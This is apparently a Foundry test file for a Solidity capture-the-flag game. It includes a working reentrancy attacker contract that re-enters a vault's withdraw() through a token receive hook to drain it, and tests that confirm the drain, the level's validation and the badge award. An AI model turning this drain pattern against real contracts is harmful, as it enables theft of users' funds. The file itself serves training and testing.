// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {CTFFactory} from "../src/CTFFactory.sol";
import {Level1_Reentrancy} from "../src/Level1_Reentrancy.sol";
import {TRACE} from "../src/TRACE.sol";

contract Level1Attacker {
    Level1_Reentrancy public vault;
    TRACE public trace;

    constructor(
        Level1_Reentrancy _vault,
        TRACE _trace
    ) {
        vault = _vault;
        trace = _trace;
    }

    function attack(uint256 amount) external {
        trace.approve(address(vault), amount);
        vault.deposit(amount);
        vault.withdraw();
    }

    function onTRCReceived(uint256) external {
        if (trace.balanceOf(address(vault)) > 0) {
            vault.withdraw();
        }
    }
}

contract Level1ReentrancyTest is Test {
    CTFFactory public factory;
    TRACE public trace;

    address public player = address(0x1234);

    function setUp() public {
        factory = new CTFFactory(
            address(0x1111222233334444555566667777888899990000)
        );

        trace = factory.trace();

        vm.deal(player, 1 ether);
    }

    function test_RevertIfLevel1NotSolved() public {
        vm.startPrank(player);

        vm.expectRevert("Must solve Level 1 first");
        factory.deployLevel2();

        vm.stopPrank();
    }

    function test_ReentrancyExploitAndValidation() public {
        vm.startPrank(player);

        // Deploy Level 1
        address instanceAddress =
            factory.deployLevel1();

        // Player gets 1 TRC
        assertEq(
            trace.balanceOf(player),
            1 ether
        );

        Level1_Reentrancy vault =
            Level1_Reentrancy(instanceAddress);

        // Factory funded the vault with 100 TRC
        assertEq(
            trace.balanceOf(address(vault)),
            100 ether
        );

        // Create attacker
        Level1Attacker attacker =
            new Level1Attacker(
                vault,
                trace
            );

        // Give attacker 1 TRC
        trace.transfer(
            address(attacker),
            1 ether
        );

        // Execute reentrancy attack
        attacker.attack(1 ether);

        // Vault should be completely drained
        assertEq(
            trace.balanceOf(address(vault)),
            0
        );

        assertTrue(
            vault.isComplete()
        );

        // Validate Level 1
        factory.validateLevel1();

        assertTrue(
            factory.isSolved(1, player)
        );

        // Badge #1
        assertEq(
            factory.badgeContract().balanceOf(
                player,
                1
            ),
            1
        );

        vm.stopPrank();
    }
}